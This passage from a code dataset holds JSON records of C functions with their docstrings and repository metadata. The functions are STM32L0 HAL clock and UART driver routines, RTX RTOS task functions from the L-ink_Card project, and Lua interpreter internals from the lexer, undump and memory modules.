while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSIRDY) != 0U)\n        {\n          if((HAL_GetTick() - tickstart ) > HSI_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n      }\n    }\n  }\n  /*----------------------------- MSI Configuration --------------------------*/\n  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)\n  {\n    /* When the MSI is used as system clock it will not be disabled */\n    if((sysclk_source == RCC_CFGR_SWS_MSI) )\n    {\n      if((__HAL_RCC_GET_FLAG(RCC_FLAG_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))\n      {\n        return HAL_ERROR;\n      }\n      /* Otherwise, just the calibration and MSI range change are allowed */\n      else\n      {\n        /* Check MSICalibrationValue and MSIClockRange input parameters */\n        assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));\n        assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));\n\n        /* Selects the Multiple Speed oscillator (MSI) clock range .*/\n        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);\n        /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/\n        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);\n\n\n        /* Update the SystemCoreClock global variable */\n        SystemCoreClock =  (32768U * (1UL << ((RCC_OscInitStruct->MSIClockRange >> RCC_ICSCR_MSIRANGE_Pos) + 1U)))\n                           >> AHBPrescTable[((RCC->CFGR & RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos)];\n\n        /* Configure the source of time base considering new system clocks settings*/\n        status = HAL_InitTick (TICK_INT_PRIORITY);\n        if(status != HAL_OK)\n        {\n          return status;\n        }\n      }\n    }\n    else\n    {\n      /* Check MSI State */\n      assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));\n\n      /* Check the MSI State */\n      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)\n      {\n        /* Enable the Multi Speed oscillator (MSI). */\n        __HAL_RCC_MSI_ENABLE();\n\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till MSI is ready */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_MSIRDY) == 0U)\n        {\n          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n        /* Check MSICalibrationValue and MSIClockRange input parameters */\n        assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));\n        assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));\n\n        /* Selects the Multiple Speed oscillator (MSI) clock range .*/\n        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);\n         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/\n        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);\n      }\n      else\n      {\n        /* Disable the Multi Speed oscillator (MSI). */\n        __HAL_RCC_MSI_DISABLE();\n\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till MSI is ready */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_MSIRDY) != 0U)\n        {\n          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n      }\n    }\n  }\n  /*------------------------------ LSI Configuration -------------------------*/\n  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)\n  {\n    /* Check the parameters */\n    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));\n\n    /* Check the LSI State */\n    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)\n    {\n      /* Enable the Internal Low Speed oscillator (LSI). */\n      __HAL_RCC_LSI_ENABLE();\n\n      /* Get Start Tick */\n      tickstart = HAL_GetTick();\n\n      /* Wait till LSI is ready */\n      while(__HAL_RCC_GET_FLAG(RCC_FLAG_LSIRDY) == 0U)\n      {\n        if((HAL_GetTick() - tickstart ) > LSI_TIMEOUT_VALUE)\n        {\n          return HAL_TIMEOUT;\n        }\n      }\n    }\n    else\n    {\n      /* Disable the Internal Low Speed oscillator (LSI). */\n      __HAL_RCC_LSI_DISABLE();\n\n      /* Get Start Tick */\n      tickstart = HAL_GetTick();\n\n      /* Wait till LSI is disabled */\n      while(__HAL_RCC_GET_FLAG(RCC_FLAG_LSIRDY) != 0U)\n      {\n        if((HAL_GetTick() - tickstart ) > LSI_TIMEOUT_VALUE)\n        {\n          return HAL_TIMEOUT;\n        }\n      }\n    }\n  }\n  /*------------------------------ LSE Configuration -------------------------*/\n  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)\n  {\n    FlagStatus       pwrclkchanged = RESET;\n\n    /* Check the parameters */\n    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));\n\n    /* Update LSE configuration in Backup Domain control register    */\n    /* Requires to enable write access to Backup Domain of necessary */\n    if(__HAL_RCC_PWR_IS_CLK_DISABLED())\n    {\n      __HAL_RCC_PWR_CLK_ENABLE();\n      pwrclkchanged = SET;\n    }\n\n    if(HAL_IS_BIT_CLR(PWR->CR, PWR_CR_DBP))\n    {\n      /* Enable write access to Backup domain */\n      SET_BIT(PWR->CR, PWR_CR_DBP);\n\n      /* Wait for Backup domain Write protection disable */\n      tickstart = HAL_GetTick();\n\n      while(HAL_IS_BIT_CLR(PWR->CR, PWR_CR_DBP))\n      {\n        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)\n        {\n          return HAL_TIMEOUT;\n        }\n      }\n    }\n\n    /* Set the new LSE configuration -----------------------------------------*/\n    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);\n    /* Check the LSE State */\n    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)\n    {\n      /* Get Start Tick */\n      tickstart = HAL_GetTick();\n\n      /* Wait till LSE is ready */\n      while(__HAL_RCC_GET_FLAG(RCC_FLAG_LSERDY) == 0U)\n      {\n        if((HAL_GetTick() - tickstart ) > RCC_LSE_TIMEOUT_VALUE)\n        {\n          return HAL_TIMEOUT;\n        }\n      }\n    }\n    else\n    {\n      /* Get Start Tick */\n      tickstart = HAL_GetTick();\n\n      /* Wait till LSE is disabled */\n      while(__HAL_RCC_GET_FLAG(RCC_FLAG_LSERDY) != 0U)\n      {\n        if((HAL_GetTick() - tickstart ) > RCC_LSE_TIMEOUT_VALUE)\n        {\n          return HAL_TIMEOUT;\n        }\n      }\n    }\n\n    /* Require to disable power clock if necessary */\n    if(pwrclkchanged == SET)\n    {\n      __HAL_RCC_PWR_CLK_DISABLE();\n    }\n  }\n\n#if defined(RCC_HSI48_SUPPORT)\n  /*----------------------------- HSI48 Configuration --------------------------*/\n  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)\n  {\n    /* Check the parameters */\n    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));\n\n      /* Check the HSI48 State */\n      if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)\n      {\n        /* Enable the Internal High Speed oscillator (HSI48). */\n        __HAL_RCC_HSI48_ENABLE();\n\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till HSI48 is ready */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSI48RDY) == 0U)\n        {\n          if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n      }\n      else\n      {\n        /* Disable the Internal High Speed oscillator (HSI48). */\n        __HAL_RCC_HSI48_DISABLE();\n\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till HSI48 is ready */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_HSI48RDY) != 0U)\n        {\n          if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n      }\n  }\n#endif /* RCC_HSI48_SUPPORT */\n\n  /*-------------------------------- PLL Configuration -----------------------*/\n  /* Check the parameters */\n  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));\n  if ((RCC_OscInitStruct->PLL.PLLState) != RCC_PLL_NONE)\n  {\n    /* Check if the PLL is used as system clock or not */\n    if(sysclk_source != RCC_SYSCLKSOURCE_STATUS_PLLCLK)\n    {\n      if((RCC_OscInitStruct->PLL.PLLState) == RCC_PLL_ON)\n      {\n        /* Check the parameters */\n        assert_param(IS_RCC_PLLSOURCE(RCC_OscInitStruct->PLL.PLLSource));\n        assert_param(IS_RCC_PLL_MUL(RCC_OscInitStruct->PLL.PLLMUL));\n        assert_param(IS_RCC_PLL_DIV(RCC_OscInitStruct->PLL.PLLDIV));\n\n        /* Disable the main PLL. */\n        __HAL_RCC_PLL_DISABLE();\n\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till PLL is disabled */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_PLLRDY)  != 0U)\n        {\n          if((HAL_GetTick() - tickstart ) > PLL_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n\n        /* Configure the main PLL clock source, multiplication and division factors. */\n        __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,\n                             RCC_OscInitStruct->PLL.PLLMUL,\n                             RCC_OscInitStruct->PLL.PLLDIV);\n        /* Enable the main PLL. */\n        __HAL_RCC_PLL_ENABLE();\n\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till PLL is ready */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_PLLRDY)  == 0U)\n        {\n          if((HAL_GetTick() - tickstart ) > PLL_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n      }\n      else\n      {\n        /* Disable the main PLL. */\n        __HAL_RCC_PLL_DISABLE();\n\n        /* Get Start Tick */\n        tickstart = HAL_GetTick();\n\n        /* Wait till PLL is disabled */\n        while(__HAL_RCC_GET_FLAG(RCC_FLAG_PLLRDY)  != 0U)\n        {\n          if((HAL_GetTick() - tickstart ) > PLL_TIMEOUT_VALUE)\n          {\n            return HAL_TIMEOUT;\n          }\n        }\n      }\n    }\n    else\n    {\n      /* Check if there is a request to disable the PLL used as System clock source */\n      if((RCC_OscInitStruct->PLL.PLLState) == RCC_PLL_OFF)\n      {\n        return HAL_ERROR;\n      }\n      else\n      {\n        /* Do not return HAL_ERROR if request repeats the current configuration */\n        pll_config = RCC->CFGR;\n        if((READ_BIT(pll_config, RCC_CFGR_PLLSRC) != RCC_OscInitStruct->PLL.PLLSource) ||\n           (READ_BIT(pll_config, RCC_CFGR_PLLMUL) != RCC_OscInitStruct->PLL.PLLMUL) ||\n           (READ_BIT(pll_config, RCC_CFGR_PLLDIV) != RCC_OscInitStruct->PLL.PLLDIV))\n        {\n          return HAL_ERROR;\n        }\n      }\n    }\n  }\n\n  return HAL_OK;\n}", "path": "L-ink_Card/Firmware/Keil/L-ink_Card/Drivers/STM32L0xx_HAL_Driver/Src/stm32l0xx_hal_rcc.c", "commit_date": "2020-06-22 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*--------------------------- rt_sys_init -----------------------------------*/\n", "func_signal": "void rt_sys_init (FUNCP first_task, U32 prio_stksz, void *stk)", "code": "{\n  /* Initialize system and start up task declared with \"first_task\". */\n  U32 i;\n\n  DBG_INIT();\n\n  /* Initialize dynamic memory and task TCB pointers to NULL. */\n  for (i = 0; i < os_maxtaskrun; i++) {\n    os_active_TCB[i] = NULL;\n  }\n  rt_init_box (&mp_tcb, mp_tcb_size, sizeof(struct OS_TCB));\n  rt_init_box (&mp_stk, mp_stk_size, BOX_ALIGN_8 | (U16)(os_stackinfo));\n  rt_init_box ((U32 *)m_tmr, mp_tmr_size, sizeof(struct OS_TMR));\n\n  /* Set up TCB of idle demon */\n  os_idle_TCB.task_id    = 255;\n  os_idle_TCB.priv_stack = 0;\n  rt_init_context (&os_idle_TCB, 0, os_idle_demon);\n\n  /* Set up ready list: initially empty */\n  os_rdy.cb_type = HCB;\n  os_rdy.p_lnk   = NULL;\n  /* Set up delay list: initially empty */\n  os_dly.cb_type = HCB;\n  os_dly.p_dlnk  = NULL;\n  os_dly.p_blnk  = NULL;\n  os_dly.delta_time = 0;\n\n  /* Fix SP and systemvariables to assume idle task is running  */\n  /* Transform main program into idle task by assuming idle TCB */\n  rt_set_PSP (os_idle_TCB.tsk_stack+32);\n  os_tsk.run = &os_idle_TCB;\n  os_tsk.run->state = RUNNING;\n\n  /* Initialize ps queue */\n  os_psq->first = 0;\n  os_psq->last  = 0;\n  os_psq->size  = os_fifo_size;\n\n  rt_init_robin ();\n\n  /* Intitialize SVC and PendSV */\n  rt_svc_init ();\n\n  /* Intitialize system clock timer */\n  os_tick_irqn = os_tick_init ();\n  if (os_tick_irqn >= 0) {\n    OS_X_INIT(os_tick_irqn);\n  }\n\n  /* Start up first user task before entering the endless loop */\n  rt_tsk_create (first_task, prio_stksz, stk, NULL);\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*--------------------------- rt_tsk_pass -----------------------------------*/\n", "func_signal": "void rt_tsk_pass (void)", "code": "{\n  /* Allow tasks of same priority level to run cooperatively.*/\n  P_TCB p_new;\n\n  p_new = rt_get_same_rdy_prio();\n  if (p_new != NULL) {\n    rt_put_prio ((P_XCB)&os_rdy, os_tsk.run);\n    os_tsk.run->state = READY;\n    rt_switch_req (p_new);\n  }\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/**\n  * @brief Disable UART Stop Mode.\n  * @param huart UART handle.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UARTEx_DisableStopMode(UART_HandleTypeDef *huart)", "code": "{\n  /* Process Locked */\n  __HAL_LOCK(huart);\n\n  /* Clear UESM bit */\n  CLEAR_BIT(huart->Instance->CR1, USART_CR1_UESM);\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(huart);\n\n  return HAL_OK;\n}", "path": "L-ink_Card/Firmware/Clion/L-ink_Card/Drivers/STM32L0xx_HAL_Driver/Src/stm32l0xx_hal_uart_ex.c", "commit_date": "2020-06-20 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/**\n  * @brief Set Wakeup from Stop mode interrupt flag selection.\n  * @note It is the application responsibility to enable the interrupt used as\n  *       usart_wkup interrupt source before entering low-power mode.\n  * @param huart           UART handle.\n  * @param WakeUpSelection Address match, Start Bit detection or RXNE/RXFNE bit status.\n  *          This parameter can be one of the following values:\n  *          @arg @ref UART_WAKEUP_ON_ADDRESS\n  *          @arg @ref UART_WAKEUP_ON_STARTBIT\n  *          @arg @ref UART_WAKEUP_ON_READDATA_NONEMPTY\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UARTEx_StopModeWakeUpSourceConfig(UART_HandleTypeDef *huart, UART_WakeUpTypeDef WakeUpSelection)", "code": "{\n  HAL_StatusTypeDef status = HAL_OK;\n  uint32_t tickstart;\n\n  /* check the wake-up from stop mode UART instance */\n  assert_param(IS_UART_WAKEUP_FROMSTOP_INSTANCE(huart->Instance));\n  /* check the wake-up selection parameter */\n  assert_param(IS_UART_WAKEUP_SELECTION(WakeUpSelection.WakeUpEvent));\n\n  /* Process Locked */\n  __HAL_LOCK(huart);\n\n  huart->gState = HAL_UART_STATE_BUSY;\n\n  /* Disable the Peripheral */\n  __HAL_UART_DISABLE(huart);\n\n  /* Set the wake-up selection scheme */\n  MODIFY_REG(huart->Instance->CR3, USART_CR3_WUS, WakeUpSelection.WakeUpEvent);\n\n  if (WakeUpSelection.WakeUpEvent == UART_WAKEUP_ON_ADDRESS)\n  {\n    UARTEx_Wakeup_AddressConfig(huart, WakeUpSelection);\n  }\n\n  /* Enable the Peripheral */\n  __HAL_UART_ENABLE(huart);\n\n  /* Init tickstart for timeout managment*/\n  tickstart = HAL_GetTick();\n\n  /* Wait until REACK flag is set */\n  if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)\n  {\n    status = HAL_TIMEOUT;\n  }\n  else\n  {\n    /* Initialize the UART State */\n    huart->gState = HAL_UART_STATE_READY;\n  }\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(huart);\n\n  return status;\n}", "path": "L-ink_Card/Firmware/Clion/L-ink_Card/Drivers/STM32L0xx_HAL_Driver/Src/stm32l0xx_hal_uart_ex.c", "commit_date": "2020-06-20 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*--------------------------- rt_tsk_self -----------------------------------*/\n", "func_signal": "OS_TID rt_tsk_self (void)", "code": "{\n  /* Return own task identifier value. */\n  if (os_tsk.run == NULL) {\n    return (0);\n  }\n  return (os_tsk.run->task_id);\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/**\n  * @brief This function handles the RCC CSS interrupt request.\n  * @note This API should be called under the NMI_Handler().\n  * @retval None\n  */\n", "func_signal": "void HAL_RCC_NMI_IRQHandler(void)", "code": "{\n  /* Check RCC CSSF flag  */\n  if(__HAL_RCC_GET_IT(RCC_IT_CSS))\n  {\n    /* RCC Clock Security System interrupt user callback */\n    HAL_RCC_CSSCallback();\n\n    /* Clear RCC CSS pending bit */\n    __HAL_RCC_CLEAR_IT(RCC_IT_CSS);\n  }\n}", "path": "L-ink_Card/Firmware/Keil/L-ink_Card/Drivers/STM32L0xx_HAL_Driver/Src/stm32l0xx_hal_rcc.c", "commit_date": "2020-06-22 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*----------------------------------------------------------------------------\n *      Local Functions\n *---------------------------------------------------------------------------*/\n", "func_signal": "static OS_TID rt_get_TID (void)", "code": "{\n  U32 tid;\n\n  for (tid = 1; tid <= os_maxtaskrun; tid++) {\n    if (os_active_TCB[tid-1] == NULL) {\n      return ((OS_TID)tid);\n    }\n  }\n  return (0);\n}", "path": "L-ink_Card/DAP-Link/Firmware/src/source/rtos/rt_Task.c", "commit_date": "2020-06-26 00:00:00", "repo_name": "peng-zhihui/L-ink_Card", "stars": 7172, "license": "gpl-3.0", "language": "c", "size": 97986}
{"docstring": "/*\n** Load precompiled chunk.\n*/\n", "func_signal": "LClosure *luaU_undump(lua_State *L, ZIO *Z, const char *name)", "code": "{\n  LoadState S;\n  LClosure *cl;\n  if (*name == '@' || *name == '=')\n    S.name = name + 1;\n  else if (*name == LUA_SIGNATURE[0])\n    S.name = \"binary string\";\n  else\n    S.name = name;\n  S.L = L;\n  S.Z = Z;\n  checkHeader(&S);\n  cl = luaF_newLclosure(L, loadByte(&S));\n  setclLvalue2s(L, L->top, cl);\n  luaD_inctop(L);\n  cl->p = luaF_newproto(L);\n  luaC_objbarrier(L, cl, cl->p);\n  loadFunction(&S, cl->p, NULL);\n  lua_assert(cl->nupvalues == cl->p->sizeupvalues);\n  luai_verifycode(L, cl->p);\n  return cl;\n}", "path": "lua/lundump.c", "commit_date": "2020-08-18 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/* LUA_NUMBER */\n/*\n** This function is quite liberal in what it accepts, as 'luaO_str2num'\n** will reject ill-formed numerals. Roughly, it accepts the following\n** pattern:\n**\n**   %d(%x|%.|([Ee][+-]?))* | 0[Xx](%x|%.|([Pp][+-]?))*\n**\n** The only tricky part is to accept [+-] only after a valid exponent\n** mark, to avoid reading '3-4' or '0xe+1' as a single number.\n**\n** The caller might have already read an initial dot.\n*/\n", "func_signal": "static int read_numeral (LexState *ls, SemInfo *seminfo)", "code": "{\n  TValue obj;\n  const char *expo = \"Ee\";\n  int first = ls->current;\n  lua_assert(lisdigit(ls->current));\n  save_and_next(ls);\n  if (first == '0' && check_next2(ls, \"xX\"))  /* hexadecimal? */\n    expo = \"Pp\";\n  for (;;) {\n    if (check_next2(ls, expo))  /* exponent mark? */\n      check_next2(ls, \"-+\");  /* optional exponent sign */\n    else if (lisxdigit(ls->current) || ls->current == '.')  /* '%x|%.' */\n      save_and_next(ls);\n    else break;\n  }\n  if (lislalpha(ls->current))  /* is numeral touching a letter? */\n    save_and_next(ls);  /* force an error */\n  save(ls, '\\0');\n  if (luaO_str2num(luaZ_buffer(ls->buff), &obj) == 0)  /* format error? */\n    lexerror(ls, \"malformed number\", TK_FLT);\n  if (ttisinteger(&obj)) {\n    seminfo->i = ivalue(&obj);\n    return TK_INT;\n  }\n  else {\n    lua_assert(ttisfloat(&obj));\n    seminfo->r = fltvalue(&obj);\n    return TK_FLT;\n  }\n}", "path": "lua/llex.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** In prototypes, the size of the array is also its number of\n** elements (to save memory). So, if it cannot shrink an array\n** to its number of elements, the only option is to raise an\n** error.\n*/\n", "func_signal": "void *luaM_shrinkvector_ (lua_State *L, void *block, int *size,\n                          int final_n, int size_elem)", "code": "{\n  void *newblock;\n  size_t oldsize = cast_sizet((*size) * size_elem);\n  size_t newsize = cast_sizet(final_n * size_elem);\n  lua_assert(newsize <= oldsize);\n  newblock = luaM_saferealloc_(L, block, oldsize, newsize);\n  *size = final_n;\n  return newblock;\n}", "path": "lua/lmem.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Load the upvalues for a function. The names must be filled first,\n** because the filling of the other fields can raise read errors and\n** the creation of the error message can call an emergency collection;\n** in that case all prototypes must be consistent for the GC.\n*/\n", "func_signal": "static void loadUpvalues (LoadState *S, Proto *f)", "code": "{\n  int i, n;\n  n = loadInt(S);\n  f->upvalues = luaM_newvectorchecked(S->L, n, Upvaldesc);\n  f->sizeupvalues = n;\n  for (i = 0; i < n; i++)  /* make array valid for GC */\n    f->upvalues[i].name = NULL;\n  for (i = 0; i < n; i++) {  /* following calls can raise errors */\n    f->upvalues[i].instack = loadByte(S);\n    f->upvalues[i].idx = loadByte(S);\n    f->upvalues[i].kind = loadByte(S);\n  }\n}", "path": "lua/lundump.c", "commit_date": "2020-08-18 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Check whether current char is in set 'set' (with two chars) and\n** saves it\n*/\n", "func_signal": "static int check_next2 (LexState *ls, const char *set)", "code": "{\n  lua_assert(set[2] == '\\0');\n  if (ls->current == set[0] || ls->current == set[1]) {\n    save_and_next(ls);\n    return 1;\n  }\n  else return 0;\n}", "path": "lua/llex.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Free memory\n*/\n", "func_signal": "void luaM_free_ (lua_State *L, void *block, size_t osize)", "code": "{\n  global_State *g = G(L);\n  lua_assert((osize == 0) == (block == NULL));\n  (*g->frealloc)(g->ud, block, osize, 0);\n  g->GCdebt -= osize;\n}", "path": "lua/lmem.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Creates a new string and anchors it in scanner's table so that it\n** will not be collected until the end of the compilation; by that time\n** it should be anchored somewhere. It also internalizes long strings,\n** ensuring there is only one copy of each unique string.  The table\n** here is used as a set: the string enters as the key, while its value\n** is irrelevant. We use the string itself as the value only because it\n** is a TValue readly available. Later, the code generation can change\n** this value.\n*/\n", "func_signal": "TString *luaX_newstring (LexState *ls, const char *str, size_t l)", "code": "{\n  lua_State *L = ls->L;\n  TString *ts = luaS_newlstr(L, str, l);  /* create new string */\n  const TValue *o = luaH_getstr(ls->h, ts);\n  if (!ttisnil(o))  /* string already present? */\n    ts = keystrval(nodefromval(o));  /* get saved copy */\n  else {  /* not in use yet */\n    TValue *stv = s2v(L->top++);  /* reserve stack space for string */\n    setsvalue(L, stv, ts);  /* temporarily anchor the string */\n    luaH_finishset(L, ls->h, stv, o, stv);  /* t[string] = string */\n    /* table is not a metatable, so it does not need to invalidate cache */\n    luaC_checkGC(L);\n    L->top--;  /* remove string from stack */\n  }\n  return ts;\n}", "path": "lua/llex.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** 'ipairs' function. Returns 'ipairsaux', given \"table\", 0.\n** (The given \"table\" may not be a table.)\n*/\n", "func_signal": "static int luaB_ipairs (lua_State *L)", "code": "{\n  luaL_checkany(L, 1);\n  lua_pushcfunction(L, ipairsaux);  /* iteration function */\n  lua_pushvalue(L, 1);  /* state */\n  lua_pushinteger(L, 0);  /* initial value */\n  return 3;\n}", "path": "lua/lbaselib.c", "commit_date": "2019-08-16 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Load a nullable string into prototype 'p'.\n*/\n", "func_signal": "static TString *loadStringN (LoadState *S, Proto *p)", "code": "{\n  lua_State *L = S->L;\n  TString *ts;\n  size_t size = loadSize(S);\n  if (size == 0)  /* no string? */\n    return NULL;\n  else if (--size <= LUAI_MAXSHORTLEN) {  /* short string? */\n    char buff[LUAI_MAXSHORTLEN];\n    loadVector(S, buff, size);  /* load string into buffer */\n    ts = luaS_newlstr(L, buff, size);  /* create string */\n  }\n  else {  /* long string */\n    ts = luaS_createlngstrobj(L, size);  /* create string */\n    setsvalue2s(L, L->top, ts);  /* anchor it ('loadVector' can GC) */\n    luaD_inctop(L);\n    loadVector(S, getstr(ts), size);  /* load directly in final place */\n    L->top--;  /* pop string */\n  }\n  luaC_objbarrier(L, p, ts);\n  return ts;\n}", "path": "lua/lundump.c", "commit_date": "2020-08-18 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Traversal function for 'ipairs'\n*/\n", "func_signal": "static int ipairsaux (lua_State *L)", "code": "{\n  lua_Integer i = luaL_checkinteger(L, 2) + 1;\n  lua_pushinteger(L, i);\n  return (lua_geti(L, 1, i) == LUA_TNIL) ? 1 : 2;\n}", "path": "lua/lbaselib.c", "commit_date": "2019-08-16 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** Load a non-nullable string into prototype 'p'.\n*/\n", "func_signal": "static TString *loadString (LoadState *S, Proto *p)", "code": "{\n  TString *st = loadStringN(S, p);\n  if (st == NULL)\n    error(S, \"bad format for constant string\");\n  return st;\n}", "path": "lua/lundump.c", "commit_date": "2020-08-18 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** First allocation will fail whenever not building initial state\n** and not shrinking a block. (This fail will trigger 'tryagain' and\n** a full GC cycle at every allocation.)\n*/\n", "func_signal": "static void *firsttry (global_State *g, void *block, size_t os, size_t ns)", "code": "{\n  if (ttisnil(&g->nilvalue) && ns > os)\n    return NULL;  /* fail */\n  else  /* normal allocation */\n    return (*g->frealloc)(g->ud, block, os, ns);\n}", "path": "lua/lmem.c", "commit_date": "2020-07-08 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** =======================================================\n** LEXICAL ANALYZER\n** =======================================================\n*/\n", "func_signal": "static int check_next1 (LexState *ls, int c)", "code": "{\n  if (ls->current == c) {\n    next(ls);\n    return 1;\n  }\n  else return 0;\n}", "path": "lua/llex.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
{"docstring": "/*\n** increment line number and skips newline sequence (any of\n** \\n, \\r, \\n\\r, or \\r\\n)\n*/\n", "func_signal": "static void inclinenumber (LexState *ls)", "code": "{\n  int old = ls->current;\n  lua_assert(currIsNewline(ls));\n  next(ls);  /* skip '\\n' or '\\r' */\n  if (currIsNewline(ls) && ls->current != old)\n    next(ls);  /* skip '\\n\\r' or '\\r\\n' */\n  if (++ls->linenumber >= MAX_INT)\n    lexerror(ls, \"chunk has too many lines\", 0);\n}", "path": "lua/llex.c", "commit_date": "2020-12-04 00:00:00", "repo_name": "lua/lua", "stars": 7830, "license": "None", "language": "c", "size": 10597}
